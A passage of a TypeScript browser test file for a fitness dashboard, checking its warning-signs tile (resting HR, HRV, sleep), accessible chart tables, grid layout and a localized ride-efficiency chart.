        ["⚠ HRV last night 50 ms, range low 58 ms", "warn"],
        ["⚠ Sleep score 55", "warn"],
      ],
      ["dot clear", "dot clear", "dot sign"],
    ]);
  });

  it("says that there are no warning signs", async () => {
    const tile = await signsTile(await openSigns(pageFile()));
    expect([tile.head, tile.warn, tile.lines, tile.dots]).toEqual([
      "No warning signs",
      false,
      [
        ["Resting HR 55 bpm, 7-day average 52.1 bpm", ""],
        ["HRV last night 66 ms, range low 58 ms", ""],
        ["Sleep score 77", ""],
      ],
      Array(7).fill("dot clear"),
    ]);
  });

  it("marks one sign on its line, but a day with one sign is a clear day", async () => {
    const tile = await signsTile(
      await openSigns(signsPage({ "2026-10-26": { hrv: { hrv: 50 } } })),
    );
    expect([tile.head, tile.warn, tile.from, tile.lines, tile.dots]).toEqual([
      "No warning signs",
      false,
      null,
      [
        ["Resting HR 55 bpm, 7-day average 52.1 bpm", ""],
        ["⚠ HRV last night 50 ms, range low 58 ms", "warn"],
        ["Sleep score 77", ""],
      ],
      Array(7).fill("dot clear"),
    ]);
  });

  it("keeps an older sign day on the strip when the newest day is clear", async () => {
    const tile = await signsTile(await openSigns(signsPage({ "2026-10-24": BAD })));
    expect([tile.head, tile.warn, tile.from, tile.dots]).toEqual([
      "No warning signs",
      false,
      null,
      [...Array(4).fill("dot clear"), "dot sign", "dot clear", "dot clear"],
    ]);
    expect(tile.titles[4]).toBe(
      "Oct 24 · warning signs · Resting HR 52 bpm, 7-day average 52.4 bpm · HRV last night 50 ms, range low 58 ms · Sleep score 55",
    );
  });

  it("flags 2 days of resting HR and sleep without any HRV rows", async () => {
    const edits = {
      "2026-10-25": { rec: { rhr: 58, sleepScore: 55 } },
      "2026-10-26": { rec: { rhr: 60, sleepScore: 55 } },
    };
    const recovery = edited(data.recovery, edits, "rec", "");
    const page = await openSigns(pageFile({ data: { ...data, hrv: [], recovery } }));
    const tile = await signsTile(page);
    expect([tile.head, tile.warn, tile.from, tile.lines, tile.dots]).toEqual([
      "2 days in a row with warning signs",
      true,
      null,
      [
        ["⚠ Resting HR 60 bpm, 7-day average 53.1 bpm", "warn"],
        ["HRV last night n/a, range low n/a", ""],
        ["⚠ Sleep score 55", "warn"],
      ],
      [...Array(5).fill("dot clear"), "dot sign", "dot sign"],
    ]);
  });

  it("never flags HRV alone, without any recovery rows", async () => {
    const edits = { "2026-10-25": { hrv: { hrv: 50 } }, "2026-10-26": { hrv: { hrv: 50 } } };
    const hrv = edited(data.hrv, edits, "hrv", "");
    const page = await openSigns(pageFile({ data: { ...data, hrv, recovery: [] } }));
    const tile = await signsTile(page);
    expect([tile.head, tile.warn, tile.from, tile.lines, tile.dots]).toEqual([
      "No warning signs",
      false,
      null,
      [
        ["Resting HR n/a, 7-day average n/a", ""],
        ["⚠ HRV last night 50 ms, range low 58 ms", "warn"],
        ["Sleep score n/a", ""],
      ],
      Array(7).fill("dot clear"),
    ]);
  });

  it("shows a day without rows as a grey dot with n/a", async () => {
    const page = await openSigns(signsPage({ "2026-10-23": { hrv: null, rec: null } }));
    const tile = await signsTile(page);
    expect([tile.dots[3], tile.titles[3], tile.alt[3]]).toEqual([
      "dot none",
      "Oct 23 · no data · Resting HR n/a, 7-day average n/a · HRV last night n/a, range low n/a · Sleep score n/a",
      "Oct 23 · no data · Resting HR n/a, 7-day average n/a · HRV last night n/a, range low n/a · Sleep score n/a",
    ]);
  });

  it("draws a sign day filled, a clear day as a ring and a day without data grey", async () => {
    const page = await openSigns(
      signsPage({
        "2026-10-23": { hrv: null, rec: null },
        "2026-10-25": BAD,
        "2026-10-26": { hrv: null },
      }),
    );
    const style = await page.$eval("[data-id=warningSigns] .tile-body", (b) => {
      const css = (sel: string, ...keys: string[]) => {
        const s = getComputedStyle(b.querySelector(sel)!);
        return Object.fromEntries(keys.map((k) => [k, s.getPropertyValue(k)]));
      };
      // the colours of the theme, resolved the same way as the dots
      const colour = (v: string) => {
        const tag = document.createElement("i");
        tag.style.color = `var(${v})`;
        b.append(tag);
        const c = getComputedStyle(tag).color;
        tag.remove();
        return c;
      };
      const dot = ["width", "height", "border-radius", "border-top", "box-sizing"];
      const fill = ["background-color", "border-top-color", "opacity"];
      return {
        warn: colour("--warn"),
        muted: colour("--muted"),
        head: css(".ws-head", "font-size", "font-weight", "margin"),
        from: css(".ws-from", "margin"),
        lines: css(
          ".ws-lines",
          "list-style-type",
          "padding",
          "margin",
          "display",
          "flex-wrap",
          "gap",
        ),
        days: css(".ws-days", "margin", "font-size"),
        strip: css(".ws-dots", "list-style-type", "padding", "margin", "display", "gap"),
        dots: [".dot.clear", ".dot.none", ".dot.sign"].map((s) => css(s, ...dot, ...fill)),
      };
    });
    const { warn, muted } = style;
    const ring = {
      width: "16px",
      height: "16px",
      "border-radius": "50%",
      "border-top": `2px solid ${warn}`,
      "box-sizing": "border-box",
    };
    expect(warn).not.toBe(muted);
    expect(style).toEqual({
      warn,
      muted,
      head: { "font-size": "20px", "font-weight": "700", margin: "0px 0px 4px" },
      from: { margin: "0px 0px 4px" },
      lines: {
        "list-style-type": "none",
        padding: "0px",
        margin: "8px 0px 12px",
        display: "flex",
        "flex-wrap": "wrap",
        gap: "4px 28px",
      },
      days: { margin: "0px 0px 6px", "font-size": "12px" },
      strip: {
        "list-style-type": "none",
        padding: "0px",
        margin: "0px 0px 10px",
        display: "flex",
        gap: "10px",
      },
      dots: [
        {
          ...ring,
          "background-color": "rgba(0, 0, 0, 0)",
          "border-top-color": warn,
          opacity: "1",
        },
        {
          ...ring,
          "border-top": `2px solid ${muted}`,
          "background-color": muted,
          "border-top-color": muted,
          opacity: "0.4",
        },
        { ...ring, "background-color": warn, "border-top-color": warn, opacity: "1" },
      ],
    });
  });

  it("does not mark the HRV of a night without its range", async () => {
    const edits = { "2026-10-26": { hrv: { hrv: 50, low: null }, rec: { sleepScore: 55 } } };
    const tile = await signsTile(await openSigns(signsPage(edits)));
    expect([tile.head, tile.lines]).toEqual([
      "No warning signs",
      [
        ["Resting HR 55 bpm, 7-day average 52.1 bpm", ""],
        ["HRV last night 50 ms, range low n/a", ""],
        ["⚠ Sleep score 55", "warn"],
      ],
    ]);
  });

  it("names the day of the signs when the newest night has not synced", async () => {
    const page = await openSigns(signsPage({ "2026-10-25": BAD, "2026-10-26": { hrv: null } }));
    const tile = await signsTile(page);
    expect([tile.head, tile.from, tile.lines, tile.dots.at(-1)]).toEqual([
      "1 day with signs: watch the next one",
      "from Oct 25",
      [
        ["Resting HR 51 bpm, 7-day average 52.7 bpm", ""],
        ["⚠ HRV last night 50 ms, range low 58 ms", "warn"],
        ["⚠ Sleep score 55", "warn"],
      ],
      "dot clear",
    ]);
  });

  it("shows n/a without HRV and recovery rows", async () => {
    const page = await openSigns(pageFile({ data: { ...data, hrv: [], recovery: [] } }));
    expect(await page.innerText("[data-id=warningSigns] .tile-body")).toBe("n/a");
    expect(await page.$("[data-id=warningSigns] .empty")).not.toBeNull();
  });

  it("is not on a page that leaves out the recovery data", async () => {
    const layout = on("warningSigns", "kpis");
    const shown = await open(browser, pageFile({ layout }));
    expect(await tiles(shown.page)).toEqual(["warningSigns", "kpis"]);
    const page = await openSigns(pageFile({ layout, settings: { exclude: ["recovery"] } }), {
      hash: "",
    });
    expect(await tiles(page)).toEqual(["kpis"]);
  });

  it("writes its texts and numbers in the language of the page", async () => {
    const edits = {
      "2026-10-25": BAD,
      "2026-10-26": { hrv: { hrv: 50 }, rec: { sleepScore: 55, rhr: 58 } },
    };
    const page = await openSigns(signsPage(edits, "", { languages: ["en", "it"] }), {
      locale: "it-IT",
    });
    expect(await page.textContent("[data-id=warningSigns] h2")).toBe("Segnali di allarme");
    const tile = await signsTile(page);
    expect([tile.head, tile.lines]).toEqual([
      "2 giorni di fila con segnali di allarme",
      [
        ["⚠ FC a riposo 58 bpm, media dei 7 giorni 52,1 bpm", "warn"],
        ["⚠ HRV della notte scorsa 50 ms, minimo dell'intervallo 58 ms", "warn"],
        ["⚠ Punteggio sonno 55", "warn"],
      ],
    ]);
  });
});

/** The body rows of the screen-reader table of a tile, as the texts of their cells. */
const tableRows = (page: Page, id: string) =>
  page.$$eval(`[data-id=${id}] .sr-only tbody tr`, (trs) =>
    trs.map((r) => [...r.children].map((c) => c.textContent)),
  );

/** A chart config for a custom widget: one dataset of `values` on the labels. */
const cfg = (values: string, options = "", labels = '["a", "b"]') =>
  `{ type: "bar", data: { labels: ${labels}, datasets: [{ label: "x", data: ${values} }] }, options: { ${options} } }`;
const yTicks = (fn: string) => `scales: { y: { ticks: { callback: ${fn} } } }`;
const POINTS = '[{x:"b",y:2},{x:"c",y:3},{x:"c",y:4}]';
const ABC = '["a", "b", "c"]';
const PLAIN = [
  ["a", "1"],
  ["b", "2"],
];

/** The table rows of a custom widget that draws `config`. */
async function customTable(config: string): Promise<(string | null)[][]> {
  const { page, errors } = await open(
    browser,
    pageFile({ widgets: [custom("tbl", `ctx.chart(el, ${config});`)], layout: on("tbl") }),
  );
  const body = await tableRows(page, "tbl");
  expect(await page.$$(".tile .error")).toEqual([]);
  expect(errors).toEqual([]);
  return body;
}

describe("chart table", () => {
  it("shows a bedtime as the clock time of the chart", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#recovery" });
    expect((await tableRows(page, "bedtime"))[0]).toEqual(["Oct 13", "23:39"]);
    expect(errors).toEqual([]);
  });

  it("shows a pace as the chart does and keeps a heart rate a number", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#walking" });
    const weeks = await tableRows(page, "walkDetails");
    // 3432 s over 5.97 km is 574.9 s/km; the heart rate axis has no tick text
    expect(weeks.find((r) => r[0] === "Oct 19")).toEqual(["Oct 19", "9:35", "98"]);
    expect(weeks.find((r) => r[0] === "Aug 10")).toEqual(["Aug 10", "", ""]);
    expect(errors).toEqual([]);
  });

  it("writes the numbers in the language of the page", async () => {
    const en = await open(browser, pageFile(), { hash: "#walking" });
    expect((await tableRows(en.page, "steps"))[0][1]).toBe("11,276");
    const ital = await open(browser, pageFile({ settings: { languages: ["it"] } }), {
      hash: "#walking",
    });
    expect((await tableRows(ital.page, "steps"))[0][1]).toBe("11.276");
    expect(ital.errors).toEqual([]);
  });

  it.each<[string, string, (string | null)[][]]>([
    [
      "labels and plain values",
      cfg("[1.234, 2]"),
      [
        ["a", "1.23"],
        ["b", "2"],
      ],
    ],
    [
      "a callback",
      cfg("[1, 2]", yTicks('(v) => v + " km"')),
      [
        ["a", "1 km"],
        ["b", "2 km"],
      ],
    ],
    [
      "the horizontal axis of a horizontal chart",
      cfg("[1, 2]", `indexAxis: "y", scales: { x: { ticks: { callback: (v) => v + " kg" } } }`),
      [
        ["a", "1 kg"],
        ["b", "2 kg"],
      ],
    ],
    [
      "not the label axis of a horizontal chart",
      cfg("[1, 2]", `indexAxis: "y", ${yTicks('(v) => v + " kg"')}`),
      PLAIN,
    ],
    [
      "a callback that throws when called without the ticks of a chart",
      cfg("[1, 2]", yTicks("(v, i, ticks) => { if (!ticks) throw new Error('x'); return v; }")),
      PLAIN,
    ],
    [
      "a callback that needs the scale",
      cfg("[1, 2]", yTicks("function (v) { return this.getLabelForValue(v); }")),
      PLAIN,
    ],
    ["a callback that gives an array", cfg("[1, 2]", yTicks("(v) => [v, 'x']")), PLAIN],
    ["a callback that gives null", cfg("[1, 2]", yTicks("() => null")), PLAIN],
    ["a callback that is not a function", cfg("[1, 2]", yTicks('"x"')), PLAIN],
    [
      "an object that is not a point",
      cfg("[{ a: 1 }, 2]"),
      [
        ["a", ""],
        ["b", "2"],
      ],
    ],
    [
      "a floating bar as its two ends",
      cfg("[[1, 3], 2]"),
      [
        ["a", "1,3"],
        ["b", "2"],
      ],
    ],
    [
      "a value that is a string",
      cfg('["5", 2]'),
      [
        ["a", "5"],
        ["b", "2"],
      ],
    ],
    [
      "a callback that gives a number",
      cfg("[1, 2]", yTicks("(v) => v * 10")),
      [
        ["a", "10"],
        ["b", "20"],
      ],
    ],
    [
      "points by label",
      cfg(POINTS, "", ABC),
      [
        ["a", ""],
        ["b", "2"],
        ["c", "3, 4"],
      ],
    ],
    [
      "points by label with a callback",
      cfg(POINTS, yTicks('(v) => v + "s"'), ABC),
      [
        ["a", ""],
        ["b", "2s"],
        ["c", "3s, 4s"],
      ],
    ],
    [
      "gaps",
      cfg("[null, 2]"),
      [
        ["a", ""],
        ["b", "2"],
      ],
    ],
    [
      "labels as they are, a number without a thousands mark and null as nothing",
      cfg("[1, 2]", "", "[2024, null]"),
      [
        ["2024", "1"],
        ["", "2"],
      ],
    ],
  ])("chart table reads %s", async (_name, config, expected) => {
    expect(await customTable(config)).toEqual(expected);
  });

  it("reads a second axis by its own callback", async () => {
    const got = await customTable(`{ type: "bar", data: { labels: ["a"], datasets: [
      { label: "x", data: [1] },
      { label: "y", data: [2], yAxisID: "y1" }] },
      options: { scales: { y1: { ticks: { callback: (v) => v + " bpm" } } } } }`);
    expect(got).toEqual([["a", "1", "2 bpm"]]);
  });

  it("reads the second value axis of a horizontal chart", async () => {
    const got = await customTable(`{ type: "bar", data: { labels: ["a"], datasets: [
      { label: "x", data: [1] },
      { label: "y", data: [2], xAxisID: "x1" }] },
      options: { indexAxis: "y", scales: { x1: { ticks: { callback: (v) => v + " kg" } } } } }`);
    expect(got).toEqual([["a", "1", "2 kg"]]);
  });

  it("keeps the x: y rows of a scatter chart without labels", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ x: 1, y: 2 }] }] } }`,
    );
    expect(got).toEqual([["1", "1: 2"]]);
  });

  it("reads the x of a point by the callback of its axis", async () => {
    const got = await customTable(`{ type: "line", data: { datasets: [
      { label: "x", data: [{ x: 1, y: 2 }] },
      { label: "y", data: [{ x: 3, y: 4 }], xAxisID: "x1" }] },
      options: { scales: { x: { ticks: { callback: (v) => "day " + v } } } } }`);
    expect(got).toEqual([["1", "day 1: 2", "3: 4"]]);
  });

  it("shows nothing for a scatter value without an x", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ y: 2 }] }] } }`,
    );
    expect(got).toEqual([["1", ""]]);
  });

  it("shows nothing for a scatter value without a y", async () => {
    const got = await customTable(
      `{ type: "scatter", data: { datasets: [{ label: "x", data: [{ x: 1 }] }] } }`,
    );
    expect(got).toEqual([["1", ""]]);
  });
});

describe("board rows", () => {
  it.each([1280, 1000])("are full and of one height on every tab at %d px", async (width) => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width, height: 900 },
    });
    const list = await page.$$eval("[role=tab]", (els) =>
      els.map((e) => e.getAttribute("data-tab")!),
    );
    expect(list.length).toBeGreaterThan(3);
    for (const tab of list) {
      await page.click(`[data-tab=${tab}]`);
      await page.waitForSelector(`[role=tabpanel][aria-labelledby=tab-${tab}]`);
      for (const shownRow of await gridRows(page)) {
        expect({ tab, ...shownRow }).toEqual({ tab, ids: shownRow.ids, heights: 1, gap: 0 });
      }
    }
    expect(errors).toEqual([]);
  });

  it("finds a lone tile by the shown tiles and their shown width on a tablet", async () => {
    const boards = {
      all: [
        { id: "activities", widget: "activities", span: 1 },
        { id: "hrv", widget: "hrv", span: 1 },
        { id: "sleep", widget: "sleep", span: 1, hidden: true },
        { id: "bedtime", widget: "bedtime", span: 1 },
        { id: "stress", widget: "bodyBattery", span: 1 },
      ],
    };
    const { page, errors } = await open(
      browser,
      pageFile({ layout: { rev: "w", base: "preset", seen: MET, boards } }),
      { viewport: { width: 1000, height: 900 } },
    );
    // Activities needs 2 columns, so HRV pairs with Bedtime past the hidden tile; the last is alone
    expect(
      await page.$$eval(".wide-tablet", (els) => els.map((e) => (e as HTMLElement).dataset.id)),
    ).toEqual(["stress"]);
    expect((await gridRows(page)).map((r) => r.gap)).toEqual([0, 0, 0]);
    expect(errors).toEqual([]);
  });

  it("gives a lone tile its width back in edit mode, so the width slider stays true", async () => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width: 1000, height: 900 },
      hash: "#running",
    });
    const zones = "[data-id=hrZones]";
    expect(await page.getAttribute(zones, "class")).toContain("wide-tablet");
    await startEdit(page);
    expect(await page.getAttribute(zones, "class")).not.toContain("wide-tablet");
    expect(await page.getAttribute(`${zones} .resize`, "aria-valuenow")).toBe("1");
    expect(errors).toEqual([]);
  });

  it("stacks a lone tile in one column on a phone", async () => {
    const { page, errors } = await open(browser, pageFile(), {
      viewport: { width: 390, height: 800 },
      hash: "#running",
    });
    expect(await page.getAttribute("[data-id=hrZones]", "class")).toContain("wide-tablet");
    const grid = await page.$eval(".grid", (e) => e.getBoundingClientRect().width);
    const widths = await page.$$eval(".grid > .tile", (els) =>
      els.map((e) => e.getBoundingClientRect().width),
    );
    expect(new Set(widths)).toEqual(new Set([grid]));
    expect(errors).toEqual([]);
  });
});

/** A ride with a normalized power (W) and an average HR, at 07:00 on `start`. */
const powerRide = (start: string, normPowerW: number, avgHR: number) => ({
  id: Number(start.replace(/\D/g, "")),
  name: "Road ride",
  type: "cycling",
  sport: "cycling",
  start: `${start} 07:00:00`,
  km: 30,
  duration: "1:00:00",
  avgHR,
  normPowerW,
});
// newest first, as the page data is; the weeks start on Monday 08-03 and end with 10-26 (in progress)
const POWER = [
  powerRide("2026-10-26", 320, 160), // at or above zone 4 (150): left out with zones
  powerRide("2026-10-21", 300, 150),
  powerRide("2026-10-20", 140, 140), // 1.0
  powerRide("2026-10-13", 130, 100), // 1.3
  powerRide("2026-10-06", 180, 120), // 1.5
  powerRide("2026-08-18", 112, 140), // 0.8
  powerRide("2026-08-11", 120, 100), // 1.2
  powerRide("2026-08-04", 130, 130), // 1.0
];
/** The page data with `activities` before the fixture's activities (3 rides without power). */
const withRides = (activities: unknown[], extra: object = {}) => ({
  ...data,
  v: DASHBOARD_VERSION,
  activities: [...activities, ...data.activities],
  ...extra,
});
/** The Ride efficiency chart: its count, its datasets with values to 2 decimals, and its axis. */
async function rideChart(page: Page, tips: [number, number][] = []) {
  return page.evaluate((at) => {
    const round = (v: unknown): unknown =>
      typeof v === "number"
        ? Math.round(v * 100) / 100
        : v && typeof v === "object"
          ? { ...v, y: round((v as { y: unknown }).y) }
          : v;
    const charts = Object.values(window.Chart!.instances).filter((c) =>
      c.canvas.closest("[data-widget=rideEfficiency]"),
    );
    const c = charts[0];
    const tip = (datasetIndex: number, dataIndex: number) => {
      const d = c!.data.datasets[datasetIndex]!;
      const v = d.data[dataIndex] as number | { y: number };
      const label = c!.options.plugins!.tooltip!.callbacks!.label as unknown as (
        x: object,
      ) => string;
      return label({
        datasetIndex,
        dataIndex,
        dataset: d,
        parsed: { y: typeof v === "number" ? v : v.y },
      });
    };
    return {
      charts: charts.length,
      good: getComputedStyle(document.documentElement).getPropertyValue("--good").trim(),
      axis: (c?.options.scales?.y as { title?: { text?: string } } | undefined)?.title?.text,
      sets: (c?.data.datasets ?? []).map((d) => {
        const x = d as unknown as Record<string, unknown>;
        return {
          label: d.label,
          data: d.data.map(round),
          border: x.borderColor,
          background: x.backgroundColor ?? null,
          line: x.showLine ?? null,
          gaps: x.spanGaps ?? null,
        };
      }),
      tips: at.map(([d, i]) => tip(d, i)),
    };
  }, tips);
}
const rideNotes = (page: Page) =>
  page.$$eval("[data-id=rideEfficiency] .note", (n) => n.map((x) => x.textContent));
const RIDE_NOTE =
  "Efficiency (normalized power per heartbeat) counts only aerobic rides, with an average HR below zone 4: intervals and races raise HR for other reasons. Higher is better.";

const LANGUAGES = ["en", "de", "es", "fr", "it", "pt"] as const;
/** The four notes, in this order: aerobic rides, no zones, no power, no ride below zone 4. */
const NOTE_CASES = [
  ["aerobic rides", POWER, {}, false],
  ["no zones", POWER, { zones: [] }, false],
  ["no power", [], {}, true],
  [
    "no ride below zone 4",
    [powerRide("2026-10-20", 300, 150), powerRide("2026-10-13", 300, 165)],
    {},
    true,
  ],
] as const;
/** The texts of the Ride efficiency tile in each page language. */
const RIDE_TEXTS: Record<
  string,
  {
    title: string;
    lastWeek: string;
    last4: string;
    axis: string;
    efficiency: string;
    rides: string;
    notes: string[];
  }
> = {
  "en-US": {
    title: "Ride efficiency",
    lastWeek: "Aerobic-ride efficiency · last week",
    last4: "Aerobic-ride efficiency · last 4 weeks",
    axis: "W per heartbeat",
    efficiency: "Efficiency",
    rides: "Aerobic rides",
    notes: [
      RIDE_NOTE,
      "Efficiency (normalized power per heartbeat) counts every ride with power: the data has no HR zones to pick the aerobic rides. Higher is better.",
      "The trend needs a power meter: no ride has a normalized power and an average HR.",
      "No ride with power has an average HR below zone 4, so no ride is aerobic.",
    ],
  },
  "de-DE": {
    title: "Rad-Effizienz",
    lastWeek: "Effizienz aerober Fahrten · letzte Woche",
    last4: "Effizienz aerober Fahrten · letzte 4 Wochen",
    axis: "W pro Herzschlag",
    efficiency: "Effizienz",
    rides: "Aerobe Fahrten",
    notes: [
      "Die Effizienz (normalisierte Leistung pro Herzschlag) zählt nur aerobe Fahrten mit einer Durchschnitts-HF unter Zone 4: Intervalle und Rennen erhöhen die HF aus anderen Gründen. Höher ist besser.",
      "Die Effizienz (normalisierte Leistung pro Herzschlag) zählt alle Fahrten mit Leistung: Die Daten haben keine HF-Zonen, um die aeroben Fahrten zu wählen. Höher ist besser.",
      "Der Trend braucht einen Leistungsmesser: Keine Fahrt hat eine normalisierte Leistung und eine Durchschnitts-HF.",
      "Keine Fahrt mit Leistung hat eine Durchschnitts-HF unter Zone 4, also ist keine Fahrt aerob.",
    ],
  },
  "es-ES": {
    title: "Eficiencia en bici",
    lastWeek: "Eficiencia de las salidas aeróbicas · última semana",
    last4: "Eficiencia de las salidas aeróbicas · últimas 4 semanas",
    axis: "W por latido",
    efficiency: "Eficiencia",
    rides: "Salidas aeróbicas",
    notes: [
      "La eficiencia (potencia normalizada por latido) solo cuenta las salidas aeróbicas, con una FC media por debajo de la zona 4: las series y las competiciones suben la FC por otros motivos. Más alto es mejor.",
      "La eficiencia (potencia normalizada por latido) cuenta todas las salidas con potencia: los datos no tienen zonas de FC para elegir las salidas aeróbicas. Más alto es mejor.",
      "La tendencia necesita un medidor de potencia: ninguna salida tiene potencia normalizada y FC media.",
      "Ninguna salida con potencia tiene una FC media por debajo de la zona 4, así que ninguna salida es aeróbica.",
    ],
  },
  "fr-FR": {
    title: "Efficacité à vélo",
    lastWeek: "Efficacité des sorties à vélo aérobies · dernière semaine",
    last4: "Efficacité des sorties à vélo aérobies · 4 dernières semaines",
    axis: "W par battement",
    efficiency: "Efficacité",
    rides: "Sorties aérobies",
    notes: [
      "L'efficacité (puissance normalisée par battement) ne compte que les sorties aérobies, avec une FC moyenne sous la zone 4 : les fractionnés et les compétitions font monter la FC pour d'autres raisons. Plus haut, c'est mieux.",
      "L'efficacité (puissance normalisée par battement) compte toutes les sorties avec puissance : les données n'ont pas de zones FC pour choisir les sorties aérobies. Plus haut, c'est mieux.",
      "La tendance a besoin d'un capteur de puissance : aucune sortie n'a de puissance normalisée et de FC moyenne.",
      "Aucune sortie avec puissance n'a une FC moyenne sous la zone 4 : aucune sortie n'est aérobie.",
    ],
  },
  "it-IT": {
    title: "Efficienza in bici",
    lastWeek: "Efficienza delle uscite aerobiche · ultima settimana",
    last4: "Efficienza delle uscite aerobiche · ultime 4 settimane",
    axis: "W per battito",
    efficiency: "Efficienza",
    rides: "Uscite aerobiche",
    notes: [
      "L'efficienza (potenza normalizzata per battito) conta solo le uscite aerobiche, con FC media sotto la zona 4: ripetute e gare alzano la FC per altri motivi. Più alta è meglio.",
      "L'efficienza (potenza normalizzata per battito) conta tutte le uscite con potenza: i dati non hanno zone FC per scegliere le uscite aerobiche. Più alta è meglio.",
      "Il trend richiede un misuratore di potenza: nessuna uscita ha potenza normalizzata e FC media.",
      "Nessuna uscita con potenza ha una FC media sotto la zona 4, quindi nessuna uscita è aerobica.",
    ],
  },
  "pt-BR": {
    title: "Eficiência no ciclismo",
    lastWeek: "Eficiência das pedaladas aeróbicas · última semana",
    last4: "Eficiência das pedaladas aeróbicas · últimas 4 semanas",
    axis: "W por batimento",
    efficiency: "Eficiência",
    rides: "Pedaladas aeróbicas",
    notes: [
      "A eficiência (potência normalizada por batimento) conta só as pedaladas aeróbicas, com FC média abaixo da zona 4: intervalados e provas sobem a FC por outros motivos. Mais alto é melhor.",
      "A eficiência (potência normalizada por batimento) conta todas as pedaladas com potência: os dados não têm zonas de FC para escolher as pedaladas aeróbicas. Mais alto é melhor.",
      "A tendência precisa de um medidor de potência: nenhuma pedalada tem potência normalizada e FC média.",
      "Nenhuma pedalada com potência tem FC média abaixo da zona 4, então nenhuma pedalada é aeróbica.",
    ],
  },
};

describe("ride efficiency", () => {
  it("gives the efficiency of the rides below zone 4, week by week, and the last 4 weeks against the first", async () => {
    const { page, errors } = await open(browser, pageFile({ data: withRides(POWER) }), {
      hash: "#cycling",
    });
    // last 4 weeks: 1.5, 1.3, 1.0 (mean 1.27); first 4 weeks: 1.0, 1.2, 0.8 (mean 1.0): +27%
    expect(await kpiTexts(page, "rideEfficiency")).toEqual({
      "Aerobic-ride efficiency · last 4 weeks": ["1.27", "▲ 27% (better) vs first 4 weeks"],
    });
    const { charts, good, axis, sets, tips } = await rideChart(page, [
      [0, 9],
      [1, 3],
    ]);
    expect(charts).toBe(1);
    expect(axis).toBe("W per heartbeat");
    expect(sets).toEqual([
      {
        label: "Efficiency",
        data: [1, 1.2, 0.8, ...Array.from({ length: 6 }, () => null), 1.5, 1.3, 1, null],
        border: good,
        background: null,
        line: null,
        gaps: true,
      },
      {
        label: "Aerobic rides",
        data: [
          { x: "Aug 3", y: 1 },
          { x: "Aug 10", y: 1.2 },
          { x: "Aug 17", y: 0.8 },
          { x: "Oct 5", y: 1.5 },
          { x: "Oct 12", y: 1.3 },
          { x: "Oct 19", y: 1 },
        ],
        border: `${good}80`,
        background: `${good}80`,
        line: false,
        gaps: null,
      },
    ]);
    expect(tips).toEqual(["Efficiency: 1.50", "Oct 6 Road ride: 1.50"]);
    expect(await rideNotes(page)).toEqual([RIDE_NOTE]);
    expect(errors).toEqual([]);
  });

  it("counts every ride with power on a page without HR zones", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ data: withRides(POWER, { zones: [] }) }),
      { hash: "#cycling" },
    );
    // the rides at 150 and 160 bpm count too: last 4 weeks 1.5, 1.3, 1.0, 2.0, 2.0 (mean 1.56)
    expect(await kpiTexts(page, "rideEfficiency")).toEqual({
      "Aerobic-ride efficiency · last 4 weeks": ["1.56", "▲ 56% (better) vs first 4 weeks"],
    });
    expect((await rideChart(page)).sets[0]?.data.slice(-4)).toEqual([1.5, 1.3, 1.5, 2]);
    expect(errors).toEqual([]);
  });

  it("gives one ride with power its tile and no chart, and no change without 3 rides at each end", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ data: withRides([powerRide("2026-10-20", 130, 100)]) }),
      { hash: "#cycling" },
    );
    expect(await kpiTexts(page, "rideEfficiency")).toEqual({
      "Aerobic-ride efficiency · last 4 weeks": ["1.30", null],
    });
    expect(await page.$("[data-id=rideEfficiency] .kpi-sub")).toBeNull();
    expect(await page.$$("[data-id=rideEfficiency] canvas")).toEqual([]);
    expect(await rideNotes(page)).toEqual([RIDE_NOTE]);
    expect(errors).toEqual([]);
  });

  it("shows n/a without a ride in the last 4 weeks, and a ride without a name by its day only", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: withRides([
          powerRide("2026-08-18", 112, 140),
          powerRide("2026-08-11", 120, 100),
          { ...powerRide("2026-08-04", 130, 130), name: undefined },
        ]),
      }),
      { hash: "#cycling" },
    );
    expect(await kpiTexts(page, "rideEfficiency")).toEqual({
      "Aerobic-ride efficiency · last 4 weeks": ["n/a", null],
    });
    expect(await page.$("[data-id=rideEfficiency] .kpi-sub")).toBeNull();
    const { charts, sets, tips } = await rideChart(page, [
      [0, 0],
      [1, 0],
      [1, 2],
    ]);
    expect(charts).toBe(1);
    expect(sets.map((s) => s.data)).toEqual([
      [1, 1.2, 0.8, ...Array.from({ length: 10 }, () => null)],
      [
        { x: "Aug 3", y: 1 },
        { x: "Aug 10", y: 1.2 },
        { x: "Aug 17", y: 0.8 },
      ],
    ]);
    expect(tips).toEqual(["Efficiency: 1.00", "Aug 4 : 1.00", "Aug 18 Road ride: 0.80"]);
    expect(await rideNotes(page)).toEqual([RIDE_NOTE]);
    expect(errors).toEqual([]);
  });

  it("draws the chart without a tile on a view of one week", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: withRides([powerRide("2026-10-22", 130, 100), powerRide("2026-10-20", 140, 140)]),
      }),
      { hash: "#cycling@2026-10-19_2026-10-19" },
    );
    expect(await page.$$("[data-id=rideEfficiency] .kpi")).toEqual([]);
    const { charts, sets } = await rideChart(page);
    expect([charts, sets[0]?.data]).toEqual([1, [1.15]]);
    expect(errors).toEqual([]);
  });

  it("counts only rides, also on a board of all activities", async () => {
    // the fixture's runs have a normalized power and an average HR below zone 4
    const layout = on("rideEfficiency");
    const all = await open(browser, pageFile({ data: withRides(POWER), layout }));
    expect(await kpiTexts(all.page, "rideEfficiency")).toEqual({
      "Aerobic-ride efficiency · last 4 weeks": ["1.27", "▲ 27% (better) vs first 4 weeks"],
    });
    const runs = data.activities.filter((a: { sport?: string }) => a.sport !== "cycling");
    const none = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: runs }, layout }),
    );
    expect(await none.page.textContent("[data-id=rideEfficiency] .tile-body")).toBe(
      "No sessions in the selected weeks.",
    );
    expect([...all.errors, ...none.errors]).toEqual([]);
  });

  it.each(
    Object.entries(RIDE_TEXTS).flatMap(([locale, { notes }]) =>
      NOTE_CASES.map(
        ([name, rides, extra, empty], i) => [locale, name, rides, extra, empty, notes[i]!] as const,
      ),
    ),
